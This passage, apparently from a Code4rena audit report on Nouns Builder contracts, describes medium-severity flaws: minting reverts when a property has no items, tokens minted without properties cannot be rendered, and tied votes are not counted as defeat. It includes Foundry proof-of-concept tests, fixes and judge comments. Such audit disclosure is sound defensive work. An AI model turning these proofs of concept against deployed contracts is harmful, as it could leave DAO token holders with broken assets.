class=\"mtk8\">&quot;uh-oh&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Founder forgot to add items.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addProperties</span><span class=\"mtk1\">(</span><span class=\"mtk12\">names</span><span class=\"mtk1\">, </span><span class=\"mtk12\">items</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ipfsGroup</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propertiesCount</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Minting a token with a property without items and getting an error.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">divisionError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Adding an item to the property. At this point, this can only be done through a governance proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">names</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">items</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk10\">ItemParam</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ItemParam</span><span class=\"mtk1\">({ </span><span class=\"mtk12\">propertyId:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;fixed&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">isNewProperty:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\"> });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addProperties</span><span class=\"mtk1\">(</span><span class=\"mtk12\">names</span><span class=\"mtk1\">, </span><span class=\"mtk12\">items</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ipfsGroup</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Success.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Short term, in the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L91\">addProperties</a>\nfunction, ensure that each newly added property has at least one item.</p>\n<p>Long term, after adding properties and items in the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L91\">addProperties</a> function, ensure that next token can be minted and rendered without errors.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459\">kulkarohan (Nouns Builder) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459#issuecomment-1258757242\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Consistently with <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523\">#523</a>, the Warden has shown how to cause <code>mint</code> to revert due to handling of properties and items, in this case by having a property without any.</p>\n<p>Because this finding shows a different way to cause a revert, I will file it separately.<br>\nBecause it shows the same type of revert as #523, I’ll judge it in the same way as Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-27-tokens-without-properties-can-be-minted-and-cannot-be-rendered\" style=\"position:relative;\"><a href=\"#m-27-tokens-without-properties-can-be-minted-and-cannot-be-rendered\" aria-label=\"m 27 tokens without properties can be minted and cannot be rendered permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455\">[M-27] Tokens without properties can be minted and cannot be rendered</a></h2>\n<p><em>Submitted by Jeiwan, also found by imare, ladboy233, and rvierdiiev</em></p>\n<p>It’s possible to mint tokens when properties haven’t yet been set in <code>MetadataRenderer</code>. Such tokens won’t be possible\nto render due to <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L222\">this check</a>\nin the <code>getAttributes</code> function of <code>MetaRenderer</code> contract. There’s no way to fix such tokens after they were minted\nsince the number of properties of each token <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L216-L219\">is stored individually</a>, thus a patched <code>MetadataRenderer</code>\nand a proxy contract need to be deployed.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider this test case:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRevert_MintedWithoutProperties</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Deploying a token and a metadata renderer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tknImpl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Token</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Token</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC1967Proxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tknImpl</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rndrImpl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetadataRenderer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MetadataRenderer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">MetadataRenderer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC1967Proxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndrImpl</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initString</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Test&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FounderParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founders</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk10\">FounderParams</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">founders</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">IManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">FounderParams</span><span class=\"mtk1\">({ </span><span class=\"mtk12\">wallet:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ownershipPct:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vestExpiry:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\"> });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founders</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initString</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initString</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Exploit starts here:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Properties haven&#39;t been added yet...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propertiesCount</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// but minting is still possible.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tkn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// 1 to the founder, 1 to the auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// When trying to render a token without properties, there&#39;s a revert.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TOKEN_NOT_MINTED(uint256)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rndr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAttributes</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The call to <code>getAttributes()</code> reverts because the token’s attributes were not set since properties hadn’t been\nadded to the metadata renderer.</p>\n<h3 id=\"recommended-mitigation-steps-31\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-31\" aria-label=\"recommended mitigation steps 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L171\">onMinted()</a> function of <code>MetadataRenderer</code>, ensure that <code>properties.length</code> is greater than 0.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1253793820\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think a better solution is to have a default display or similar, but the finding is correct</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258651736\">iainnash (Nouns Builder) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Duplicate of <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459\">#459</a>?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258654916\">iainnash (Nouns Builder) commented</a>:</strong></p>\n<blockquote>\n<p>Slightly different from the other ticket mentioned. Not sure if this is a medium risk bug or more of an inconvenience since the mint succeeds and the DAO can vote to upgrade the impl.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258766840\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459\">#459</a>, which shows a way to achieve a revert, this report shows how to mint a token without any properties.</p>\n<p>The question we are left to ask is whether a token without any property is a unique and “rarer” token, a mistake, a placeholder, or something else.</p>\n<p>We could argue that the finding is informational in nature as the “lens” of the codebase, the MetadataRenderer is the only contract that will revert.</p>\n<p>On the other hand, the lens will be reverting with a <code>TOKEN_NOT_MINTED</code> error.</p>\n<p>Meaning that we can argue that while the token exists, the token is in a state that is not well defined.</p>\n<p>Because upgrades are not in-scope we can only argue with the finding and the code in scope at this time.</p>\n<p>Because the contract will not revert in minting one or more people may end up purchasing a token that is “in limbo”.</p>\n<p>While a bit of a stretch, given the irrefutable POC, showing that this can happen by “forgetting to set properties”, I think Medium Severity to be appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-28-state-function-does-not-require-majority-of-votes-for-supporting-and-passing-a-proposal\" style=\"position:relative;\"><a href=\"#m-28-state-function-does-not-require-majority-of-votes-for-supporting-and-passing-a-proposal\" aria-label=\"m 28 state function does not require majority of votes for supporting and passing a proposal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626\">[M-28] State function does not require majority of votes for supporting and passing a proposal</a></h2>\n<p><em>Submitted by rbserver, also found by csanuragjain and Solimander</em></p>\n<p>When determining the proposal’s state, the following <code>state</code> function is called, which can execute <code>else if (proposal.forVotes &#x3C; proposal.againstVotes || proposal.forVotes &#x3C; proposal.quorumVotes) { return ProposalState.Defeated; }</code>. If <code>proposal.forVotes</code> and <code>proposal.againstVotes</code> are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the <code>state</code> function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get a copy of the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the proposal exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_DOES_NOT_EXIST</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// If the proposal was executed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Executed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal was canceled:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">canceled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Canceled</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if the proposal was vetoed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vetoed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Vetoed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Else if voting has not started:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span 